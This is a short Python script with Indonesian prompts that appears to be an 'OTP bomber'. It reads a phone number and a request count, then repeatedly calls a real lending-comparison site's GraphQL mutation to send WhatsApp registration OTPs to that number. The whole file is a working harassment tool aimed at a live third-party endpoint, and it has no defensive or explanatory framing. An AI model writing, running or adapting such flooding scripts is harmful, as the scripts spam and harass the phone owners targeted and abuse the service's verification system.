import requests

url = 'https://edge.cermati.com/graphql'
headers = {
}

query = '''
    mutation RequestOtpByToken($input: RequestOtpByToken_Input!) {
        requestOtpByToken(input: $input) {
            ... on OtpRequest_Response {
                token
                remainingAttempts
            }
            ... on UnauthorizedError {
                errorCode
                errorMessage
                errorName
                maxAttempts
                isError
            }
            ... on ForbiddenError {
                errorCode
                errorMessage
                errorName
                existedValue
                remainingAttempts
                requireCaptcha
                identifierType
                isError
            }
            ... on ValidationError {
                errorCode
                errorMessage
                errorName
                isError
            }
            ... on TooManyRequestError {
                errorCode
                errorMessage
                errorName
                isError
                ttl
            }
            ... on LockedError {
                errorCode
                errorMessage
                errorName
                isError
                ttl
            }
            ... on NotFoundError {
                errorCode
                errorMessage
                errorName
                isError
                identifierType
            }
            ... on InternalServerError {
                errorCode
                errorMessage
                isError
            }
        }
    }
'''

# Input nomor telepon dan jumlah permintaan
phone_number = input("Masukkan nomor telepon: ")
num_requests = int(input("Masukkan jumlah permintaan: "))

# Membentuk payload permintaan
variables = {
    'input': {
        'action': 'REGISTER',
        'identifier': phone_number,
        'method': 'whatsapp'
    }
}
payload = {
    'operationName': 'RequestOtpByToken',
    'variables': variables,
    'query': query
}

# Mengirim permintaan sebanyak jumlah yang diminta
for _ in range(num_requests):
    # Kirim permintaan ke endpoint GraphQL
    response = requests.post(url, headers=headers, json=payload)

    # Periksa kode status HTTP
    if response.status_code == 200:
        # Ambil data dari respons
        data = response.json()
        otp_response = data['data']['requestOtpByToken']
        if 'token' in otp_response:
            token = otp_response['token']
            print("Token OTP:", token)
        elif 'errorMessage' in otp_response:
            error_message = otp_response['errorMessage']
            print("Gagal meminta OTP. Pesan kesalahan:", error_message)
    else:
        print("Gagal mengirim permintaan GraphQL. Kode status:", response.status_code)

